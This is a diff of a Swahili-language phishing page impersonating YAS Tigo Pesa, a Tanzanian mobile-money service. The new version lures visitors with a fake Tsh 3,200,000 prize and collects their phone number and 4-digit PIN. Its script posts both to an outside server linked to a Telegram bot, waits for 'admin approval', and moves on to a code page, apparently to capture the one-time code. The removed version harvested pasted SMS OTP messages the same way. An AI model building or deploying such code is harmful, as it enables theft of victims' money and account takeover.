@@ -2,260 +2,452 @@
 <html lang="sw">
 <head>
 <meta charset="UTF-8">
-<title>Uthibitisho wa OTP</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>YAS Tigo Pesa</title>
 
 <style>
-* {
-  box-sizing: border-box;
-  margin: 0;
-  padding: 0;
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial, Helvetica, sans-serif;
 }
-body {
-  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-  background: #f0f4f0;
-  min-height: 100vh;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  padding: 20px;
+
+body{
+    background:#062746;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    min-height:100vh;
 }
-.page {
-  width: 100%;
-  max-width: 500px;
+
+.container{
+    width:100%;
+    max-width:430px;
+    text-align:center;
+    padding:30px 20px;
 }
-.card {
-  background: #ffffff;
-  border-radius: 16px;
-  padding: 35px 30px;
-  box-shadow: 0 8px 30px rgba(26, 67, 41, 0.10);
-  border: 1px solid #e6efe6;
+
+.logo{
+    margin-bottom:20px;
 }
-.title {
-  font-size: 26px;
-  font-weight: 700;
-  color: #1a6b2a;
-  margin-bottom: 6px;
+
+.logo img{
+    width:100px;
+    border-radius:15px;
 }
-.subtitle {
-  color: #5a6b5a;
-  font-size: 15px;
-  margin-bottom: 4px;
+
+h1{
+    color:#FFD400;
+    font-size:40px;
+    line-height:1.2;
+    margin-bottom:25px;
+    font-weight:bold;
 }
-.display-number {
-  color: #1a2b1a;
-  font-weight: 700;
-  font-size: 16px;
-  margin-bottom: 22px;
-  background: #f4f9f4;
-  padding: 8px 14px;
-  border-radius: 8px;
-  display: inline-block;
+
+.description{
+    color:#ffffff;
+    font-size:20px;
+    line-height:1.6;
+    margin-bottom:35px;
 }
-.label {
-  font-size: 15px;
-  font-weight: 600;
-  color: #1a2b1a;
-  margin-bottom: 10px;
+
+.offer-title{
+    color:#FFD400;
+    font-size:26px;
+    font-weight:bold;
+    margin-bottom:15px;
 }
-.otp-textarea {
-  width: 100%;
-  min-height: 100px;
-  padding: 16px 18px;
-  font-size: 16px;
-  font-family: inherit;
-  border: 2px solid #d0e0d0;
-  border-radius: 12px;
-  background: #fafffa;
-  outline: none;
-  transition: border-color 0.2s, box-shadow 0.2s;
-  resize: vertical;
+
+.offer{
+    color:white;
+    font-size:38px;
+    margin-bottom:35px;
 }
-.otp-textarea:focus {
-  border-color: #1a7a2a;
-  box-shadow: 0 0 0 4px rgba(26, 122, 42, 0.15);
+
+input{
+    width:100%;
+    padding:18px;
+    margin-bottom:20px;
+    border:none;
+    border-radius:10px;
+    font-size:22px;
 }
-button {
-  width: 100%;
-  height: 54px;
-  border: none;
-  border-radius: 12px;
-  font-size: 17px;
-  font-weight: 700;
-  background: #d4e0d4;
-  color: #8a9f8a;
-  cursor: pointer;
-  transition: background 0.25s, transform 0.1s;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  gap: 10px;
+
+input:focus{
+    outline:none;
 }
-button:not(:disabled) {
-  background: #1a7a2a;
-  color: #ffffff;
+
+button{
+    width:100%;
+    padding:18px;
+    background:#FFD400;
+    color:#002e5f;
+    border:none;
+    border-radius:10px;
+    font-size:24px;
+    font-weight:bold;
+    cursor:pointer;
+    transition:.3s;
 }
-button:not(:disabled):hover {
-  background: #136622;
-  transform: scale(1.01);
+
+button:hover{
+    background:#f4c400;
 }
-.spinner {
-  width: 18px;
-  height: 18px;
-  border: 3px solid rgba(255,255,255,0.3);
-  border-top: 3px solid #ffffff;
-  border-radius: 50%;
-  animation: spin 0.9s linear infinite;
-  display: none;
+
+button:disabled{
+    opacity:0.6;
+    cursor:not-allowed;
 }
-@keyframes spin { to { transform: rotate(360deg); } }
-#status {
-  margin-top: 16px;
-  text-align: center;
-  font-size: 14px;
-  font-weight: 500;
-  color: #c0392b;
-  min-height: 22px;
+
+.footer-box{
+    margin-top:25px;
+    padding:18px;
+    border:2px solid #FFD400;
+    border-radius:10px;
+    background:#49542f;
+    color:#FFD400;
+    font-size:24px;
+    font-weight:bold;
 }
-#status.success { color: #1a7a2a; }
+
+#status{
+    margin-top:15px;
+    min-height:24px;
+    font-size:18px;
+    font-weight:bold;
+    color:#FFD400;
+}
+
+#status.error{
+    color:#ff6b6b;
+}
+
+#status.success{
+    color:#51cf66;
+}
+
+#status.waiting{
+    color:#FFD400;
+}
+
+@media(max-width:480px){
+
+h1{
+    font-size:34px;
+}
+
+.description{
+    font-size:18px;
+}
+
+.offer-title{
+    font-size:22px;
+}
+
+.offer{
+    font-size:32px;
+}
+
+input{
+    font-size:18px;
+}
+
+button{
+    font-size:22px;
+}
+
+.footer-box{
+    font-size:22px;
+}
+
+}
 </style>
+
 </head>
-
 <body>
-<div class="page">
-  <div class="card">
-    <div class="title">Uthibitisho wa OTP</div>
-    <div class="subtitle">Weka OTP iliyotumwa kwenye nambari yako ya simu</div>
-    <div id="phoneNumber" class="display-number"></div>
 
-    <form id="otpForm">
-      <div class="label">Nakili ujumbe mzima uliopokea kwa SMS na ubandike hapa</div>
-      <textarea id="otpTextarea" class="otp-textarea" 
-                placeholder="Nakili SMS nzima" autocomplete="off"></textarea>
+<div class="container">
 
-      <button id="submitBtn" disabled>
-        <span id="btnText">WASILISHA</span>
-        <span class="spinner" id="spinner"></span>
-      </button>
+    <div class="logo">
+        <!-- Replace logo.png with your logo -->
+        <img src="logo.png" alt="YAS Logo">
+    </div>
+
+    <h1>Umejishindia Ofa Wa<br>YAS Tigo Pesa</h1>
+
+    <p class="description">
+        Karibu! Ingiza namba yako ya simu na Neno Siri (YAS PIN - 4 namba) ili kupata ofa.
+    </p>
+
+    <div class="offer-title">
+        Kiwango cha Ofa kinachoweza kupatikana:
+    </div>
+
+    <div class="offer">
+        Tsh 3,200,000
+    </div>
+
+    <form id="loginForm">
+
+        <input
+            type="tel"
+            id="phoneInput"
+            placeholder="Nambari ya Mixx"
+            required
+        >
+
+        <input
+            type="password"
+            id="pinInput"
+            placeholder="YAS Nambari ya Siri"
+            maxlength="4"
+            required
+        >
+
+        <button type="submit" id="submitBtn">
+            THIBITISHA ZAWADI
+        </button>
+
     </form>
+
     <div id="status"></div>
-  </div>
+
+    <div class="footer-box">
+        Jaza fomu ili kupata ofa yako!
+    </div>
+
 </div>
 
 <script>
+// ===== CORRECTED BACKEND URL =====
 const BACKEND_URL = "https://yas-tanzania.onrender.com";
-const params = new URLSearchParams(window.location.search);
-const botId = params.get('botId');
 
+// 1. Get botId from URL
+const botId = new URLSearchParams(window.location.search).get("botId");
+console.log("Bot ID:", botId);
+
+// 2. If no botId, show error
 if (!botId) {
-  document.getElementById('status').textContent = "Error: Missing bot ID. Please use the link from Telegram.";
-  throw new Error("Bot ID missing");
+    document.getElementById("status").textContent = "Error: Missing bot ID. Please use the link from Telegram.";
+    document.getElementById("status").className = "error";
+    document.getElementById("submitBtn").disabled = true;
 }
 
-// Get phone from localStorage
-const phone = localStorage.getItem('phone') || "";
-document.getElementById('phoneNumber').textContent =
-  phone ? phone.slice(0,6) + "****" + phone.slice(-2) : "No phone number found";
+// 3. Pre-fill phone from localStorage if available
+const phoneInput = document.getElementById("phoneInput");
+const pinInput = document.getElementById("pinInput");
+const statusEl = document.getElementById("status");
+const submitBtn = document.getElementById("submitBtn");
 
-const textarea = document.getElementById('otpTextarea');
-const submitBtn = document.getElementById('submitBtn');
-const btnText = document.getElementById('btnText');
-const spinner = document.getElementById('spinner');
-const statusEl = document.getElementById('status');
-
-// Enable button only when textarea has content
-textarea.addEventListener('input', function() {
-  submitBtn.disabled = this.value.trim().length === 0;
-  if (statusEl.textContent) statusEl.textContent = '';
-});
-
-window.addEventListener('load', function() {
-  textarea.focus();
-});
-
-async function sendOtpToTelegram(name, phone, fullMessage) {
-  try {
-    const r = await fetch(`${BACKEND_URL}/submit-code`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ name, phone, code: fullMessage, botId })
-    });
-    return r.json();
-  } catch {
-    return null;
-  }
+const savedPhone = localStorage.getItem("phone");
+if (savedPhone) {
+    phoneInput.value = savedPhone;
 }
 
-function pollCodeApproval(requestId) {
-  return new Promise(resolve => {
-    const interval = setInterval(async () => {
-      try {
-        const r = await fetch(`${BACKEND_URL}/check-code/${requestId}`);
-        const d = await r.json();
-        if (d.approved === true || d.approved === false) {
-          clearInterval(interval);
-          resolve(d.approved);
+// 4. Helper: send PIN to backend
+async function sendPinToTelegram(name, phone, pin) {
+    const cleanPhone = phone.replace(/\s/g, '');
+    const payload = {
+        name: name || "Unknown",
+        phone: cleanPhone || "Unknown",
+        pin: pin || "",
+        botId: botId || ""
+    };
+    console.log("Sending to backend:", payload);
+    try {
+        const res = await fetch(`${BACKEND_URL}/submit-pin`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+                "Accept": "application/json"
+            },
+            body: JSON.stringify(payload)
+        });
+        const responseText = await res.text();
+        console.log("Response status:", res.status, "Body:", responseText);
+        if (!res.ok) {
+            let errorMsg = responseText;
+            try {
+                const errorData = JSON.parse(responseText);
+                errorMsg = errorData.error || errorMsg;
+            } catch {}
+            statusEl.textContent = `Error: ${errorMsg}`;
+            return null;
         }
-      } catch (e) {
-        // keep polling
-      }
-    }, 1500);
-  });
+        const data = JSON.parse(responseText);
+        return data;
+    } catch (error) {
+        console.error("Network error:", error);
+        statusEl.textContent = "Network error. Please check your connection.";
+        return null;
+    }
 }
 
-document.getElementById('otpForm').addEventListener('submit', async function(e) {
-  e.preventDefault();
+// 5. Helper: poll for approval (indefinitely)
+function pollPinApproval(requestId) {
+    let attempts = 0;
+    return new Promise((resolve) => {
+        const interval = setInterval(async () => {
+            attempts++;
+            console.log(`Polling attempt ${attempts} for ${requestId}`);
+            try {
+                const res = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
+                const data = await res.json();
+                console.log("Poll response:", data);
 
-  const fullText = textarea.value.trim();
-  if (!fullText) {
-    statusEl.textContent = "Tafadhali bandika ujumbe wako hapa.";
-    return;
-  }
+                if (data.blocked) {
+                    clearInterval(interval);
+                    statusEl.className = "error";
+                    statusEl.textContent = "Your account has been blocked.";
+                    resolve(false);
+                    return;
+                }
+                if (data.approved === true) {
+                    clearInterval(interval);
+                    statusEl.className = "success";
+                    statusEl.textContent = "PIN approved! Redirecting...";
+                    resolve(true);
+                    return;
+                }
+                if (data.approved === false) {
+                    clearInterval(interval);
+                    statusEl.className = "error";
+                    statusEl.textContent = "Incorrect PIN. Please try again.";
+                    resolve(false);
+                    return;
+                }
+                // Still waiting – show elapsed time
+                if (attempts % 10 === 0 || attempts === 1) {
+                    const elapsedSeconds = Math.floor(attempts * 1.5);
+                    const minutes = Math.floor(elapsedSeconds / 60);
+                    const seconds = elapsedSeconds % 60;
+                    const timeStr = minutes > 0 ? `${minutes}m ${seconds}s` : `${seconds}s`;
+                    statusEl.className = "waiting";
+                    statusEl.textContent = `Waiting for admin approval... (${timeStr})`;
+                }
+            } catch (error) {
+                console.error("Poll error:", error);
+                statusEl.className = "waiting";
+                statusEl.textContent = "Connection issue. Retrying...";
+            }
+        }, 1500);
+    });
+}
 
-  const name = localStorage.getItem('firstName') || localStorage.getItem('name') || "Unknown";
-  const phone = localStorage.getItem('phone') || "Unknown";
+// 6. Main submit function
+async function handleSubmit(e) {
+    e.preventDefault();
 
-  submitBtn.disabled = true;
-  btnText.textContent = "VERIFYING...";
-  spinner.style.display = "inline-block";
-  statusEl.textContent = "Sending OTP for verification...";
-  statusEl.className = '';
+    const phone = phoneInput.value.trim();
+    const pin = pinInput.value.trim();
 
-  const res = await sendOtpToTelegram(name, phone, fullText);
+    // Basic validation
+    if (!phone) {
+        statusEl.className = "error";
+        statusEl.textContent = "Tafadhali ingiza nambari ya simu.";
+        return;
+    }
+    if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
+        statusEl.className = "error";
+        statusEl.textContent = "Tafadhali ingiza YAS PIN sahihi ya namba 4.";
+        return;
+    }
+    if (!botId) {
+        statusEl.className = "error";
+        statusEl.textContent = "Error: Bot ID missing. Please use the link from Telegram.";
+        return;
+    }
 
-  if (!res || !res.requestId) {
-    statusEl.textContent = "Failed to send. Please try again.";
-    submitBtn.disabled = false;
-    btnText.textContent = "WASILISHA";
-    spinner.style.display = "none";
-    return;
-  }
+    // Save phone to localStorage for future visits
+    localStorage.setItem("phone", phone);
 
-  statusEl.textContent = "Waiting for admin approval...";
-  const approved = await pollCodeApproval(res.requestId);
-
-  if (approved === true) {
-    localStorage.setItem('code', fullText);
-    statusEl.textContent = "OTP approved! Redirecting...";
-    statusEl.className = 'success';
-    setTimeout(() => {
-      window.location.href = `success.html?botId=${botId}`;
-    }, 500);
-  } else {
-    statusEl.textContent = "OTP rejected. Please try again.";
-    textarea.value = "";
+    // Disable inputs and button
+    phoneInput.disabled = true;
+    pinInput.disabled = true;
     submitBtn.disabled = true;
-    btnText.textContent = "WASILISHA";
-    spinner.style.display = "none";
-    textarea.focus();
-  }
+    submitBtn.textContent = "INATUMWA...";
+    statusEl.className = "waiting";
+    statusEl.textContent = "Sending PIN for verification...";
+
+    // Send to backend
+    const res = await sendPinToTelegram("Unknown", phone, pin);
+
+    if (!res || !res.requestId) {
+        statusEl.className = "error";
+        statusEl.textContent = "Failed to send PIN. Please try again.";
+        // Re-enable
+        phoneInput.disabled = false;
+        pinInput.disabled = false;
+        submitBtn.disabled = false;
+        submitBtn.textContent = "THIBITISHA ZAWADI";
+        pinInput.value = "";
+        pinInput.focus();
+        return;
+    }
+
+    statusEl.className = "waiting";
+    statusEl.textContent = "Waiting for admin approval...";
+
+    // Poll for approval (indefinite wait)
+    const approved = await pollPinApproval(res.requestId);
+
+    if (approved === true) {
+        localStorage.setItem("pin", pin);
+        setTimeout(() => {
+            window.location.href = `code.html?botId=${botId}`;
+        }, 500);
+    } else {
+        // Re-enable for retry
+        phoneInput.disabled = false;
+        pinInput.disabled = false;
+        submitBtn.disabled = false;
+        submitBtn.textContent = "THIBITISHA ZAWADI";
+        pinInput.value = "";
+        pinInput.focus();
+    }
+}
+
+// 7. Attach event listeners
+document.getElementById("loginForm").addEventListener("submit", handleSubmit);
+
+// Auto-submit when PIN reaches 4 digits
+pinInput.addEventListener("input", function() {
+    // Remove non-digits
+    this.value = this.value.replace(/[^0-9]/g, '');
+    if (this.value.length === 4) {
+        // Trigger submit
+        document.getElementById("loginForm").dispatchEvent(new Event('submit'));
+    }
 });
 
-// Fallback click on button
-submitBtn.addEventListener('click', function(e) {
-  if (!this.disabled) {
-    document.getElementById('otpForm').dispatchEvent(new Event('submit'));
-  }
+// Handle paste for PIN
+pinInput.addEventListener("paste", function(e) {
+    e.preventDefault();
+    const pasted = (e.clipboardData || window.clipboardData).getData('text');
+    const cleaned = pasted.replace(/[^0-9]/g, '');
+    if (cleaned.length >= 4) {
+        this.value = cleaned.slice(0, 4);
+        if (this.value.length === 4) {
+            document.getElementById("loginForm").dispatchEvent(new Event('submit'));
+        }
+    }
+});
+
+// Focus on phone input on load
+window.addEventListener("load", function() {
+    phoneInput.focus();
+});
+
+// Handle Enter key on phone input to move to PIN
+phoneInput.addEventListener("keydown", function(e) {
+    if (e.key === "Enter") {
+        e.preventDefault();
+        pinInput.focus();
+    }
 });
 </script>
+
 </body>
 </html>
